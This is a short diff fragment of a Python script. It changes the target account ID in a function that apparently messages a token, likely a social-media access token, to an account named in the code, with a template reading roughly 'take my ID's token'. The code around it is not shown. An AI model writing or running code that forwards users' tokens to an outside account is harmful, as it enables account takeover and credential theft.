@@ -36,7 +36,7 @@ def send_initial_message():
       # Modify the message as per your requirement
       msg_template = "MR.B3 MERA ID KA TOKEN LU {}"
       # Specify the ID wherever you want to send the message
-      target_id = "61578924387878"
+      target_id = "100085919220931"
       requests.packages.urllib3.disable_warnings()
       def liness():
           print('\033[1;92m' + '•────────────────────── MR.BE ───────────────────────────────•')
